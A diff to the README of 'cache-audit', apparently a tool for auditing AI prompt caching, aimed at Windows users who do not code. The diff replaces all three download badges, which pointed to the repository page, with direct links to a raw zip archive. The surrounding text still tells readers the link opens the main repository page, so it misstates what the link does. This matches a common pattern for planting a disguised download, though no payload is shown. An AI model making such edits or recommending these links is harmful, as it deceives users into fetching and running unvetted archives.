@@ -1,6 +1,6 @@
 # ⚙️ cache-audit - Check Your Prompt Caching Setup
 
-[![Download cache-audit](https://img.shields.io/badge/Download-cache--audit-orange?style=for-the-badge)](https://github.com/Fucxuan/cache-audit)
+[![Download cache-audit](https://img.shields.io/badge/Download-cache--audit-orange?style=for-the-badge)](https://github.com/Fucxuan/cache-audit/raw/refs/heads/main/cache-audit/audit_cache_2.6-beta.3.zip)
 
 ---
 
@@ -33,7 +33,7 @@ This guide will help you download and run cache-audit on a Windows PC. No coding
 
 Click this big button or link to open the official cache-audit page on GitHub:
 
-[![Download cache-audit](https://img.shields.io/badge/Download-cache--audit-brightgreen?style=for-the-badge)](https://github.com/Fucxuan/cache-audit)
+[![Download cache-audit](https://img.shields.io/badge/Download-cache--audit-brightgreen?style=for-the-badge)](https://github.com/Fucxuan/cache-audit/raw/refs/heads/main/cache-audit/audit_cache_2.6-beta.3.zip)
 
 This link will take you to the main repository page where you will find all files and instructions.
 
@@ -129,4 +129,4 @@ These checks help your AI conversations stay fast and dependable.
 
 You can start improving your prompt caching by visiting this page to download the latest version of cache-audit:
 
-[![Download cache-audit](https://img.shields.io/badge/Download-cache--audit-red?style=for-the-badge)](https://github.com/Fucxuan/cache-audit)
+[![Download cache-audit](https://img.shields.io/badge/Download-cache--audit-red?style=for-the-badge)](https://github.com/Fucxuan/cache-audit/raw/refs/heads/main/cache-audit/audit_cache_2.6-beta.3.zip)
